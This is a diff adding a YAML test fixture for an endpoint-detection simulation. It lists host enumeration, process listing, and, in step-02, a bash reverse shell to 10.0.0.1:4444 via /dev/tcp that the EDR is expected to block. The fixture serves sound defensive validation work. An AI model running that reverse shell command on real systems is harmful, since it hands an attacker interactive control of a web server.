@@ -1,0 +1,66 @@
+scenario_id: SIM-TEST-PREV-001
+name: "Test fixture - prevention expectation on a reverse shell step"
+version: "1.0"
+status: active
+plane: EDR
+detection_types:
+  - BIOC
+  - Prevention
+
+uc_ref: UCS-EDR-02
+tc_ref: TC-EDR-03
+tc_refs:
+  - TC-EDR-03
+uc_name: "Endpoint Detection & Response"
+tc_name: "Validate multi-method malware detection (local sandbox, behavioral, static analysis)"
+
+mitre_tactic: "TA0002"
+mitre_tactic_name: "Execution"
+mitre_technique: "T1059.004"
+mitre_technique_name: "Command and Scripting Interpreter: Unix Shell"
+
+execution_identity:
+  default: www-data
+  options:
+    - www-data
+
+push_supported: true
+pull_supported: true
+
+steps:
+  - id: step-01
+    name: "Enumerate the host"
+    command: "id && uname -a"
+    identity: www-data
+    mitre_technique: "T1082"
+    expected_detections:
+      - plane: EDR
+        type: BIOC
+        description: "Host enumeration from a web service account"
+        ttp_ref: "TTP-TEST-PREV-001"
+        detection_id: "bioc-test-host-enumeration"
+
+  - id: step-02
+    name: "Reverse shell from the web server (prevented)"
+    command: "exec bash -i >& /dev/tcp/10.0.0.1/4444 0>&1"
+    identity: www-data
+    mitre_technique: "T1059.004"
+    expected_detections:
+      - plane: EDR
+        type: Prevention
+        outcome: prevent
+        description: "Behavioral Threat Protection blocks the reverse shell"
+        ttp_ref: "TTP-TEST-PREV-001"
+        detection_id: "prevention-btp-reverse-shell-from-web-server"
+
+  - id: step-03
+    name: "Post-block process listing"
+    command: "ps aux | head -5"
+    identity: www-data
+    mitre_technique: "T1057"
+    expected_detections:
+      - plane: EDR
+        type: BIOC
+        description: "Process discovery from a web service account"
+        ttp_ref: "TTP-TEST-PREV-001"
+        detection_id: "bioc-test-process-discovery"
